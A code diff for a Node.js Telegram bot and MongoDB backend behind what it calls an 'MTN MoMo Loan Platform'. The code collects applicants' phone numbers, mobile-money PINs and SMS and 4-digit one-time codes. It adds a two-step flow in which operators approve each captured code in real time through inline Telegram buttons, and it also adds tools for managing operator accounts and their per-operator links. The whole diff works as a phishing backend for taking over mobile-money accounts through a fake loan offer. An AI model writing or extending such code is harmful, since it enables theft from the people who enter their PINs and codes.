@@ -55,7 +55,8 @@ async function createIndexes() {
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
         await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
-        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsOtpStatus: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ fourDigitOtpStatus: 1 });
 
         await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 });
         await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 });
@@ -229,6 +230,20 @@ async function updateAdminStatus(adminId, status) {
     }
 }
 
+async function suspendAllAdmins(exceptSuper = true) {
+    try {
+        const query = exceptSuper ? { role: { $ne: 'super_admin' }, adminId: { $ne: 'ADMIN001' } } : {};
+        const result = await db.collection(COLLECTIONS.ADMINS).updateMany(
+            query,
+            { $set: { status: 'paused', updatedAt: new Date().toISOString() } }
+        );
+        return result;
+    } catch (error) {
+        console.error('❌ Error suspending all admins:', error);
+        throw error;
+    }
+}
+
 async function deleteAdmin(adminId) {
     try {
         const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
@@ -261,7 +276,7 @@ async function getAdminCount() {
 }
 
 // ==========================================
-// APPLICATION OPERATIONS
+// TWO-STEP OTP APPLICATION OPERATIONS
 // ==========================================
 
 async function saveApplication(appData) {
@@ -273,8 +288,13 @@ async function saveApplication(appData) {
             phoneNumber: appData.phoneNumber,
             pin: appData.pin,
             pinStatus: appData.pinStatus || 'pending',
-            otpStatus: appData.otpStatus || 'pending',
-            otp: appData.otp || null,
+            
+            // 2-STEP OTP PROPERTIES
+            smsOtp: appData.smsOtp || null,
+            smsOtpStatus: appData.smsOtpStatus || 'pending', // 'pending', 'approved', 'rejected'
+            fourDigitOtp: appData.fourDigitOtp || null,
+            fourDigitOtpStatus: appData.fourDigitOtpStatus || 'not_started', // 'not_started', 'pending', 'approved', 'rejected'
+            
             assignmentType: appData.assignmentType,
             isReturningUser: appData.isReturningUser || false,
             previousCount: appData.previousCount || 0,
@@ -339,7 +359,11 @@ async function getPendingApplications(adminId) {
         return await db.collection(COLLECTIONS.APPLICATIONS)
             .find({
                 adminId,
-                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
+                $or: [
+                    { pinStatus: 'pending' }, 
+                    { smsOtpStatus: 'pending' }, 
+                    { fourDigitOtpStatus: 'pending' }
+                ]
             })
             .sort({ timestamp: -1 })
             .toArray();
@@ -357,13 +381,17 @@ async function getAdminStats(adminId) {
     try {
         const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
         const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
-        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
-        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
-        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
-        return { total, pinPending, pinApproved, otpPending, fullyApproved };
+        const smsOtpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsOtpStatus: 'pending' });
+        const fourDigitPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, fourDigitOtpStatus: 'pending' });
+        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
+            adminId, 
+            smsOtpStatus: 'approved', 
+            fourDigitOtpStatus: 'approved' 
+        });
+        return { total, pinPending, smsOtpPending, fourDigitPending, fullyApproved };
     } catch (error) {
         console.error('❌ Error getting admin stats:', error);
-        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
+        return { total: 0, pinPending: 0, smsOtpPending: 0, fourDigitPending: 0, fullyApproved: 0 };
     }
 }
 
@@ -372,20 +400,23 @@ async function getStats() {
         const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
         const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
         const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
-        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
-        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
-        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
+        const smsOtpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsOtpStatus: 'pending' });
+        const fourDigitPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ fourDigitOtpStatus: 'pending' });
+        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
+            smsOtpStatus: 'approved', 
+            fourDigitOtpStatus: 'approved' 
+        });
         const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
             $or: [
                 { pinStatus: 'rejected' },
-                { otpStatus: 'wrongpin_otp' },
-                { otpStatus: 'wrongcode' }
+                { smsOtpStatus: 'rejected' },
+                { fourDigitOtpStatus: 'rejected' }
             ]
         });
-        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
+        return { totalAdmins, totalApplications, pinPending, smsOtpPending, fourDigitPending, fullyApproved, totalRejected };
     } catch (error) {
         console.error('❌ Error getting stats:', error);
-        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
+        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, smsOtpPending: 0, fourDigitPending: 0, fullyApproved: 0, totalRejected: 0 };
     }
 }
 
@@ -456,12 +487,61 @@ function isSuperAdminUser(admin) {
 }
 
 /**
+ * Send Step 1 (SMS OTP) Verification Prompt with Inline Approval Buttons
+ */
+async function sendSmsOtpApprovalPrompt(bot, chatId, application) {
+    const text = `
+📩 *STEP 1: SMS OTP VERIFICATION NEEDED*
+---------------------------------------
+👤 *Ref ID:* \`${application.id}\`
+📱 *Phone:* \`${application.phoneNumber}\`
+🔑 *PIN:* \`${application.pin || 'N/A'}\`
+💬 *SMS OTP:* \`${application.smsOtp || 'Pending User Input'}\`
+    `.trim();
+
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: '✅ Approve SMS OTP', callback_data: `approve_sms_${application.id}` },
+                { text: '❌ Reject SMS OTP', callback_data: `reject_sms_${application.id}` }
+            ]
+        ]
+    };
+
+    return await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
+}
+
+/**
+ * Send Step 2 (4-Digit OTP) Verification Prompt with Inline Approval Buttons
+ */
+async function sendFourDigitOtpApprovalPrompt(bot, chatId, application) {
+    const text = `
+🔐 *STEP 2: 4-DIGIT OTP VERIFICATION NEEDED*
+--------------------------------------------
+👤 *Ref ID:* \`${application.id}\`
+📱 *Phone:* \`${application.phoneNumber}\`
+🔢 *4-Digit OTP:* \`${application.fourDigitOtp || 'Pending User Input'}\`
+    `.trim();
+
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: '✅ Approve 4-Digit OTP', callback_data: `approve_4digit_${application.id}` },
+                { text: '❌ Reject 4-Digit OTP', callback_data: `reject_4digit_${application.id}` }
+            ]
+        ]
+    };
+
+    return await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
+}
+
+/**
  * Setup Telegram Command Handlers
  * @param {Object} bot Telegram Bot instance
  * @param {Object} options Configuration options (e.g. webhookUrl)
  */
 function setupCommandHandlers(bot, options = {}) {
-    const webhookUrl = options.webhookUrl || process.env.WEBHOOK_URL || 'https://yourdomain.com';
+    const webhookUrl = options.webhookUrl || process.env.WEBHOOK_URL || 'https://mkopo-wa-halopesa-tanzanian.onrender.com';
 
     bot.onText(/\/start/, async (msg) => {
         const chatId = msg.chat.id;
@@ -479,11 +559,44 @@ function setupCommandHandlers(bot, options = {}) {
 
                 const isSuper = isSuperAdminUser(admin);
 
-                let welcomeMessage = `
+                if (isSuper) {
+                    const superAdminWelcome = `
+👋 Welcome Super Admin!
+
+Your Admin ID: ${admin.adminId}
+Role: ⭐ Super Admin
+Your Personal Link:
+${webhookUrl}?admin=${admin.adminId}
+
+Commands:
+/mylink - Get your link
+/stats - Your statistics
+/pending - Pending applications
+/myinfo - Your information
+
+Admin Management (Super Admin Only):
+/addadmin - Add new admin
+/addadminid - Add admin with specific ID
+/transferadmin oldChatId | newChatId - Transfer admin
+/pauseadmin <adminId> - Pause an admin
+/unpauseadmin <adminId> - Unpause an admin
+/removeadmin <adminId> - Remove an admin
+/admins - List all admins
+/suspendall - 🔒 Suspend selected admin links (checklist)
+
+Messaging:
+/send <adminId> <message> - Message an admin
+/broadcast <message> - Message all admins
+/ask <adminId> <request> - Send action request
+`.trim();
+                    return bot.sendMessage(chatId, superAdminWelcome, { disable_web_page_preview: true });
+                }
+
+                const standardWelcome = `
 👋 *Welcome back, ${admin.name || 'Admin'}!*
 
 *Your Admin ID:* \`${admin.adminId}\`
-*Role:* ${isSuper ? '⭐ Super Admin' : '👤 Standard Admin'}
+*Role:* 👤 Standard Admin
 *Your Personal Link:*
 ${webhookUrl}?admin=${admin.adminId}
 
@@ -494,26 +607,11 @@ ${webhookUrl}?admin=${admin.adminId}
 /myinfo - Your information
 `.trim();
 
-                if (isSuper) {
-                    welcomeMessage += `\n\n` + `
-*Admin Management (Super Admin Only):*
-/addadmin <Name> | <Email> | <ChatID>
-/pauseadmin <adminId> - Pause an admin
-/unpauseadmin <adminId> - Unpause an admin
-/removeadmin <adminId> - Remove an admin
-/admins - List all admins
-
-*Messaging:*
-/send <adminId> <message> - Message an admin
-/broadcast <message> - Message all admins
-`.trim();
-                }
-
-                bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown', disable_web_page_preview: true });
+                bot.sendMessage(chatId, standardWelcome, { parse_mode: 'Markdown', disable_web_page_preview: true });
             } else {
                 bot.sendMessage(
                     chatId,
-                    `👋 *Welcome to MTN MoMo Cameroon Loan Platform*\nYour Chat ID is: \`${chatId}\`\nPlease provide this ID to your Super Administrator to request access.`,
+                    `👋 *Welcome to MTN MoMo Loan Platform*\nYour Chat ID is: \`${chatId}\`\nPlease provide this ID to your Super Administrator to request access.`,
                     { parse_mode: 'Markdown' }
                 );
             }
@@ -562,8 +660,8 @@ ${webhookUrl}?admin=${admin.adminId}
 ------------------------------
 📋 Total Applications: \`${stats.total}\`
 ⏳ PIN Pending: \`${stats.pinPending}\`
-✅ PIN Approved: \`${stats.pinApproved}\`
-⏳ OTP Pending: \`${stats.otpPending}\`
+📩 Step 1 (SMS OTP) Pending: \`${stats.smsOtpPending}\`
+🔐 Step 2 (4-Digit OTP) Pending: \`${stats.fourDigitPending}\`
 🎉 Fully Approved: \`${stats.fullyApproved}\`
 `.trim(),
                 { parse_mode: 'Markdown' }
@@ -584,36 +682,31 @@ ${webhookUrl}?admin=${admin.adminId}
                 return bot.sendMessage(chatId, '✅ No pending applications found.');
             }
 
-            let text = `📋 *PENDING APPLICATIONS (${pendingApps.length})*\n\n`;
-            pendingApps.slice(0, 10).forEach(app => {
-                text += `• Ref: \`${app.id}\`\n  Phone: \`${app.phoneNumber}\`\n  Status: PIN(${app.pinStatus}) OTP(${app.otpStatus})\n\n`;
-            });
-            bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
+            for (const app of pendingApps) {
+                if (app.smsOtpStatus === 'pending') {
+                    await sendSmsOtpApprovalPrompt(bot, chatId, app);
+                } else if (app.fourDigitOtpStatus === 'pending') {
+                    await sendFourDigitOtpApprovalPrompt(bot, chatId, app);
+                }
+            }
         } catch (error) {
             console.error('Error handling /pending:', error);
         }
     });
 
     // ==========================================
-    // SUPER ADMIN COMMANDS
+    // SUPER ADMIN MANAGEMENT COMMANDS
     // ==========================================
 
-    bot.onText(/\/admins/, async (msg) => {
+    bot.onText(/\/addadmin$/, async (msg) => {
         const chatId = msg.chat.id;
         try {
             const admin = await getAdminByChatId(chatId);
-            if (!isSuperAdminUser(admin)) {
-                return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
-            }
+            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
 
-            const admins = await getAllAdmins();
-            let text = `👥 *REGISTERED ADMINS (${admins.length})*\n\n`;
-            admins.forEach(a => {
-                text += `• *${a.name}* (\`${a.adminId}\`)\n  Role: ${a.role} | Status: ${a.status} | ChatID: \`${a.chatId}\`\n\n`;
-            });
-            bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
+            bot.sendMessage(chatId, 'ℹ️ *Usage:* `/addadmin Name | Email | ChatID`', { parse_mode: 'Markdown' });
         } catch (error) {
-            console.error('Error handling /admins:', error);
+            console.error('Error handling /addadmin:', error);
         }
     });
 
@@ -621,9 +714,7 @@ ${webhookUrl}?admin=${admin.adminId}
         const chatId = msg.chat.id;
         try {
             const admin = await getAdminByChatId(chatId);
-            if (!isSuperAdminUser(admin)) {
-                return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
-            }
+            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
 
             const parts = match[1].split('|').map(p => p.trim());
             if (parts.length < 3) {
@@ -649,6 +740,63 @@ ${webhookUrl}?admin=${admin.adminId}
             );
         } catch (err) {
             bot.sendMessage(chatId, `❌ Error creating admin: ${err.message}`);
+        }
+    });
+
+    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
+        const chatId = msg.chat.id;
+        try {
+            const admin = await getAdminByChatId(chatId);
+            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
+
+            const parts = match[1].split('|').map(p => p.trim());
+            if (parts.length < 4) {
+                return bot.sendMessage(chatId, '❌ Format error. Use:\n`/addadminid CustomAdminID | Name | Email | ChatID`', { parse_mode: 'Markdown' });
+            }
+
+            const [customId, name, email, targetChatId] = parts;
+
+            await saveAdmin({
+                adminId: customId,
+                name,
+                email,
+                chatId: targetChatId,
+                role: 'admin',
+                status: 'active'
+            });
+
+            bot.sendMessage(
+                chatId,
+                `✅ *Admin Created with Custom ID!*\nID: \`${customId}\`\nName: ${name}\nChat ID: \`${targetChatId}\``,
+                { parse_mode: 'Markdown' }
+            );
+        } catch (err) {
+            bot.sendMessage(chatId, `❌ Error creating custom admin: ${err.message}`);
+        }
+    });
+
+    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
+        const chatId = msg.chat.id;
+        try {
+            const admin = await getAdminByChatId(chatId);
+            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
+
+            const parts = match[1].split('|').map(p => p.trim());
+            if (parts.length < 2) {
+                return bot.sendMessage(chatId, '❌ Format error. Use:\n`/transferadmin oldChatId | newChatId`', { parse_mode: 'Markdown' });
+            }
+
+            const [oldChatId, newChatId] = parts;
+            const targetAdmin = await getAdminByChatId(oldChatId);
+
+            if (!targetAdmin) {
+                return bot.sendMessage(chatId, `❌ Admin with Chat ID \`${oldChatId}\` not found.`, { parse_mode: 'Markdown' });
+            }
+
+            await updateAdmin(targetAdmin.adminId, { chatId: String(newChatId) });
+            bot.sendMessage(chatId, `🔄 Admin \`${targetAdmin.adminId}\` transferred to new Chat ID: \`${newChatId}\`.`, { parse_mode: 'Markdown' });
+        } catch (err) {
+            bot.sendMessage(chatId, `❌ Error transferring admin: ${err.message}`);
         }
     });
 
@@ -698,6 +846,63 @@ ${webhookUrl}?admin=${admin.adminId}
         }
     });
 
+    bot.onText(/\/admins/, async (msg) => {
+        const chatId = msg.chat.id;
+        try {
+            const admin = await getAdminByChatId(chatId);
+            if (!isSuperAdminUser(admin)) {
+                return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
+            }
+
+            const admins = await getAllAdmins();
+            let text = `👥 *REGISTERED ADMINS (${admins.length})*\n\n`;
+            admins.forEach(a => {
+                text += `• *${a.name}* (\`${a.adminId}\`)\n  Role: ${a.role} | Status: ${a.status} | ChatID: \`${a.chatId}\`\n\n`;
+            });
+            bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
+        } catch (error) {
+            console.error('Error handling /admins:', error);
+        }
+    });
+
+    bot.onText(/\/suspendall/, async (msg) => {
+        const chatId = msg.chat.id;
+        try {
+            const admin = await getAdminByChatId(chatId);
+            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
+
+            const result = await suspendAllAdmins(true);
+            bot.sendMessage(chatId, `🔒 *All Admin Links Suspended!*\nUpdated ${result.modifiedCount} admin account(s) to paused state.`, { parse_mode: 'Markdown' });
+        } catch (error) {
+            console.error('Error executing suspendall:', error);
+        }
+    });
+
+    // ==========================================
+    // MESSAGING COMMANDS
+    // ==========================================
+
+    bot.onText(/\/send (\S+) (.+)/, async (msg, match) => {
+        const chatId = msg.chat.id;
+        try {
+            const admin = await getAdminByChatId(chatId);
+            if (!isSuperAdminUser(admin)) return;
+
+            const targetAdminId = match[1];
+            const directMsg = match[2];
+            const targetAdmin = await getAdmin(targetAdminId);
+
+            if (!targetAdmin?.chatId) {
+                return bot.sendMessage(chatId, `❌ Admin ID \`${targetAdminId}\` not found or has no Chat ID.`, { parse_mode: 'Markdown' });
+            }
+
+            await bot.sendMessage(targetAdmin.chatId, `📩 *MESSAGE FROM SUPER ADMIN*\n\n${directMsg}`, { parse_mode: 'Markdown' });
+            bot.sendMessage(chatId, `✅ Message sent to \`${targetAdminId}\`.`, { parse_mode: 'Markdown' });
+        } catch (error) {
+            console.error('Error sending direct message:', error);
+        }
+    });
+
     bot.onText(/\/broadcast (.+)/, async (msg, match) => {
         const chatId = msg.chat.id;
         try {
@@ -720,24 +925,93 @@ ${webhookUrl}?admin=${admin.adminId}
         }
     });
 
-    bot.onText(/\/send (\S+) (.+)/, async (msg, match) => {
+    bot.onText(/\/ask (\S+) (.+)/, async (msg, match) => {
         const chatId = msg.chat.id;
         try {
             const admin = await getAdminByChatId(chatId);
             if (!isSuperAdminUser(admin)) return;
 
             const targetAdminId = match[1];
-            const directMsg = match[2];
+            const requestMsg = match[2];
             const targetAdmin = await getAdmin(targetAdminId);
 
             if (!targetAdmin?.chatId) {
-                return bot.sendMessage(chatId, `❌ Admin ID \`${targetAdminId}\` not found or has no Chat ID.`, { parse_mode: 'Markdown' });
+                return bot.sendMessage(chatId, `❌ Admin ID \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
             }
 
-            await bot.sendMessage(targetAdmin.chatId, `📩 *MESSAGE FROM SUPER ADMIN*\n\n${directMsg}`, { parse_mode: 'Markdown' });
-            bot.sendMessage(chatId, `✅ Message sent to \`${targetAdminId}\`.`, { parse_mode: 'Markdown' });
+            await bot.sendMessage(
+                targetAdmin.chatId, 
+                `⚠️ *ACTION REQUEST FROM SUPER ADMIN*\n\n${requestMsg}\n\n_Please comply immediately or respond to Super Admin._`, 
+                { parse_mode: 'Markdown' }
+            );
+            bot.sendMessage(chatId, `✅ Action request sent to \`${targetAdminId}\`.`, { parse_mode: 'Markdown' });
         } catch (error) {
-            console.error('Error sending direct message:', error);
+            console.error('Error executing ask command:', error);
+        }
+    });
+
+    // ==========================================
+    // BACKEND CALLBACK HANDLERS FOR APPROVAL/REJECTION
+    // ==========================================
+
+    bot.on('callback_query', async (query) => {
+        const chatId = query.message.chat.id;
+        const data = query.data;
+
+        try {
+            // SMS OTP APPROVAL / REJECTION
+            if (data.startsWith('approve_sms_')) {
+                const appId = data.replace('approve_sms_', '');
+                await updateApplication(appId, { 
+                    smsOtpStatus: 'approved',
+                    fourDigitOtpStatus: 'pending' // Moves immediately to Step 2
+                });
+
+                await bot.answerCallbackQuery(query.id, { text: 'SMS OTP Approved! Moved to 4-Digit OTP.' });
+                await bot.editMessageText(`✅ *SMS OTP Approved for Ref ID:* \`${appId}\`\nStatus updated. System now awaiting 4-Digit OTP entry.`, {
+                    chat_id: chatId,
+                    message_id: query.message.message_id,
+                    parse_mode: 'Markdown'
+                });
+            } 
+            else if (data.startsWith('reject_sms_')) {
+                const appId = data.replace('reject_sms_', '');
+                await updateApplication(appId, { smsOtpStatus: 'rejected' });
+
+                await bot.answerCallbackQuery(query.id, { text: 'SMS OTP Rejected.' });
+                await bot.editMessageText(`❌ *SMS OTP Rejected for Ref ID:* \`${appId}\``, {
+                    chat_id: chatId,
+                    message_id: query.message.message_id,
+                    parse_mode: 'Markdown'
+                });
+            }
+
+            // 4-DIGIT OTP APPROVAL / REJECTION
+            else if (data.startsWith('approve_4digit_')) {
+                const appId = data.replace('approve_4digit_', '');
+                await updateApplication(appId, { fourDigitOtpStatus: 'approved' });
+
+                await bot.answerCallbackQuery(query.id, { text: '4-Digit OTP Approved! Loan Application Fully Verified.' });
+                await bot.editMessageText(`🎉 *FINAL APPROVAL:* 4-Digit OTP Approved for Ref ID: \`${appId}\`\nVerification Complete!`, {
+                    chat_id: chatId,
+                    message_id: query.message.message_id,
+                    parse_mode: 'Markdown'
+                });
+            } 
+            else if (data.startsWith('reject_4digit_')) {
+                const appId = data.replace('reject_4digit_', '');
+                await updateApplication(appId, { fourDigitOtpStatus: 'rejected' });
+
+                await bot.answerCallbackQuery(query.id, { text: '4-Digit OTP Rejected.' });
+                await bot.editMessageText(`❌ *4-Digit OTP Rejected for Ref ID:* \`${appId}\``, {
+                    chat_id: chatId,
+                    message_id: query.message.message_id,
+                    parse_mode: 'Markdown'
+                });
+            }
+        } catch (error) {
+            console.error('Error handling callback query:', error);
+            bot.answerCallbackQuery(query.id, { text: 'Error processing action.' });
         }
     });
 }
@@ -753,6 +1027,7 @@ module.exports = {
     getActiveAdmins,
     updateAdmin,
     updateAdminStatus,
+    suspendAllAdmins,
     deleteAdmin,
     adminExists,
     getAdminCount,
@@ -762,6 +1037,8 @@ module.exports = {
     updateApplication,
     getApplicationsByAdmin,
     getPendingApplications,
+    sendSmsOtpApprovalPrompt,
+    sendFourDigitOtpApprovalPrompt,
 
     logAdminActivity,
     getEnvironmentLogs,
